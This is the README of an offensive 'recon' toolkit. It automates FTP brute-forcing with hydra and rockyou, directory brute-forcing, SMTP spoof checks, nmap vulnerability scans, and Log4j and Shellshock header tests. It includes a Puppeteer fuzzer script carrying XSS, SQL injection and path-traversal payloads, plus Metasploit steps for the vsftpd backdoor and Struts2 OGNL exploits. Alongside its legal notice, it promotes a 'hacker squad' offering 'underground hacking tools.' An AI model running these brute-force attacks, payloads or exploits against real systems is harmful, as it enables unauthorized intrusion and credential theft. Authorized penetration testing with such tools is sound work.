# 🛡️ RED HAT Reconning Toolkit

A **Red-Team-grade Bash + JavaScript Recon Suite** to simulate black-hat recon, fuzzing, brute-forcing, payload injection, and CVE discovery — all automated into a single streamlined script. Use this for penetration testing, ethical red teaming, or private bounty recon.

---

## 🎯 Features

- 🔐 TLS/SSL version checks  
- 🔍 HTTP header security audit  
- 📂 Directory brute-forcing with `dirb`  
- 🔓 FTP brute-forcing with `hydra`  
- ✉️ SMTP spoof simulation via HELO  
- 🛡️ CVE & service vulnerability scan with `nmap`  
- 💉 Custom payload injection (XSS, LFI, SSRF, RCE, etc.)  
- 🌐 WHOIS + reverse DNS discovery  
- 🧪 JavaScript-based fuzzing via headless Chrome (Puppeteer)  
- 🎯 Log4j + Shellshock + DNS rebinding header-based testing  
- 📡 DNS enumeration with `dnsrecon`

---


---

## 📣 Join the Community

Want to stay updated with real-world exploits, red teaming strategies, and underground hacking tools?  
**Become part of the StackMorgan hacker squad:**

- 🟢 **WhatsApp Channel**  
  👉 [Join here](https://whatsapp.com/channel/0029VbArnawB4hdTQZuJ9r3U)

- 🔴 **YouTube Channel**  
  👉 [Subscribe here](https://youtube.com/@mr_termux-r2l?si=Vqa9r39h7skjBIw7)

Stay sharp with:

✅ Zero-day testing demos  
✅ Payload crafting tutorials  
✅ Deep recon & post-exploit analysis  
✅ Real-world hacking simulations  
✅ Full walkthroughs of this tool

> 🚨 Don't just scan. **Exploit. Learn. Lead.**

---


## ⚙️ Requirements

Make sure the following tools are installed:

| Tool         | Install Command (Linux/Termux)                     |
|--------------|----------------------------------------------------|
| `curl`       | `pkg install curl`                                 |
| `openssl`    | `pkg install openssl-tool`                         |
| `whois`      | `pkg install whois`                                |
| `dirb`       | `pkg install dirb` or `apt install dirb`           |
| `hydra`      | `pkg install hydra`                                |
| `nmap`       | `pkg install nmap`                                 |
| `node`       | `pkg install nodejs`                               |
| `dnsrecon`   | `pip install dnsrecon`                             |
| `puppeteer`  | `npm install puppeteer` in the script directory    |

Ensure you also have the wordlists:
- `/usr/share/wordlists/dirb/common`
- `/usr/share/wordlists/rockyou.txt`

---

## 🧑‍💻 Usage

### Step 1: Clone or Copy the Repo

```bash
git clone https://github.com/your-username/redhat-recon.git
cd redhat-recon

for termux:

chmod +x recon.sh
 run bash recon.sh

advance reconning 

chmod +x stackrecon
bash stackrecon.sh


Step 2: Create the JavaScript Fuzzer

// js_fuzzer.js
const puppeteer = require('puppeteer');
const url = process.argv[2];

(async () => {
  const browser = await puppeteer.launch({ headless: true });
  const page = await browser.newPage();

  const payloads = [
    "<script>alert(1)</script>",
    "' OR '1'='1",
    "../../etc/passwd",
    "<img src=x onerror=alert(1)>"
  ];

  for (const p of payloads) {
    await page.goto(`${url}/?q=${encodeURIComponent(p)}`, { waitUntil: 'domcontentloaded' });
    console.log(`[+] Tested payload: ${p}`);
  }

  await browser.close();
})();

Install Puppeteer:

npm install puppeteer

Step 3: Run the Recon Script

./stackrecon.sh

You'll be prompted to enter a target domain or IP.


---

📂 Output File: results.txt

After the scan, check results.txt for:

Section	Description

[1] TLS Support	Shows SSL/TLS protocol support
[2] HTTP Headers	Shows which headers are missing (insecure setup)
[3] Directory Bruteforce	All found directories using dirb
[4] FTP Brute-force	Tries admin user with rockyou wordlist
[5] JS Fuzzing	Reports attempted JS-based payloads
[6] SMTP Spoof	Reports if open relay is possible
[7] CVE Detection	Uses nmap vulnerability scripts
[8] Payload Injection	Sends XSS, SSRF, LFI, redirect payloads
[9] WHOIS/rDNS	Domain & owner metadata
[10] Header Exploits	Sends headers to test for Log4j & Shellshock
[11] DNSRecon	Basic DNS zone enumeration



---

🔫 Metasploit Integration (Manual)

After identifying ports/services:

msfconsole

Example:

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <ip>
set RPORT 21
run

Or for a web vuln:

use exploit/multi/http/apache_struts2_content_type_ognl
set RHOSTS <ip>
set RPORT 8080
run


---

💡 Tips
run bash recon.sh for a small payloads
Note 
termux recon does not include hydra and mwtasploit

You can edit payloads in stackrecon.sh to include your custom XSS/LFI/RCE/SSRF strings.

Add custom wordlists by modifying paths in dirb and hydra commands.

Use proxychains if running from behind a VPN or TOR.

Combine with tools like Burp, ZAP, or Nuclei for deeper analysis.



---

⚠️ Legal Notice

> This toolkit is strictly for authorized penetration testing, red teaming, and ethical security research.
Do NOT use against any system without written permission.
Misuse of this tool can lead to criminal charges.





🧨 Final Words

The Red Hat Reconning Toolkit gives you the offensive edge to think like a hacker and act like a pro. It brings together modern web fuzzing, classic port scanning, and realistic payload simulation in one blast-ready tool.

Use wisely. Learn deeply. Test legally.
